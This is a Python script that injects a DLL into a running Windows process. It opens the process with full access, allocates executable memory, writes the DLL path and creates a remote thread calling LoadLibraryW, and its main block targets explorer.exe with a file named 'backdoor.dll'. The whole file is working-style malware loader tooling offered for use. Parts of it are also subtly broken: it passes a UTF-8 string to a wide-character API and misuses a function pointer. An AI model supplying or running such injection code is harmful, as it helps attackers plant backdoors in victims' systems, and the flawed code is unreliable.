import ctypes
import psutil
import logging

def get_process_id(process_name):
    for proc in psutil.process_iter(['name']):
        if proc.info['name'] == process_name:
            return proc.pid
    return None

def inject_dll(dll_path, process_name):
    process_id = get_process_id(process_name)
    if process_id is None:
        logging.error(f"No process named {process_name} found.")
        return

    try:
        # Load necessary functions from kernel32.dll
        kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)
        
        # OpenProcess function with required parameters
        open_process = kernel32.OpenProcess
        open_process.argtypes = [ctypes.c_ulong, ctypes.c_bool, ctypes.c_ulong]
        open_process.restype = ctypes.c_void_p

        # VirtualAllocEx function with required parameters
        virtual_alloc_ex = kernel32.VirtualAllocEx
        virtual_alloc_ex.argtypes = [ctypes.c_void_p, ctypes.c_void_p, ctypes.c_size_t, ctypes.c_ulong, ctypes.c_ulong]
        virtual_alloc_ex.restype = ctypes.c_void_p

        # WriteProcessMemory function with required parameters
        write_process_memory = kernel32.WriteProcessMemory
        write_process_memory.argtypes = [ctypes.c_void_p, ctypes.c_void_p, ctypes.c_void_p, ctypes.c_size_t, ctypes.c_void_p]
        write_process_memory.restype = ctypes.c_bool

        # CreateRemoteThread function with required parameters
        create_remote_thread = kernel32.CreateRemoteThread
        create_remote_thread.argtypes = [ctypes.c_void_p, ctypes.c_void_p, ctypes.c_size_t, ctypes.c_void_p, ctypes.c_void_p, ctypes.c_ulong, ctypes.c_void_p]
        create_remote_thread.restype = ctypes.c_void_p

        # Attempt to open the target process
        process_handle = open_process(0x1F0FFF, False, process_id)
        if not process_handle:
            raise ctypes.WinError()

        # Allocate memory in the target process for the DLL path
        dll_path_bytes = dll_path.encode('utf-8')
        address = virtual_alloc_ex(process_handle, 0, len(dll_path_bytes) + 1, 0x3000, 0x40)
        if not address:
            raise ctypes.WinError()

        # Write DLL path into the allocated memory
        if not write_process_memory(process_handle, address, dll_path_bytes, len(dll_path_bytes), None):
            raise ctypes.WinError()

        # Load the DLL in the process using LoadLibraryW
        load_library = kernel32.GetProcAddress(kernel32.GetModuleHandleA(b"kernel32.dll"), b"LoadLibraryW")
        load_library.restype = ctypes.c_void_p

        if not load_library:
            raise ctypes.WinError()

        # Create a remote thread to run LoadLibraryW with the DLL path
        thread_id = create_remote_thread(process_handle, None, 0, load_library, address, 0, None)
        if not thread_id:
            raise ctypes.WinError()

    except OSError as e:
        logging.error(f"Error injecting DLL into {process_name}: {e}")

if __name__ == "__main__":
    logging.basicConfig(level=logging.ERROR)
    
    dll_path = "path/to/backdoor.dll"  # Replace with the actual path
    process_name = "explorer.exe"  # Replace with the target process name
    inject_dll(dll_path, process_name)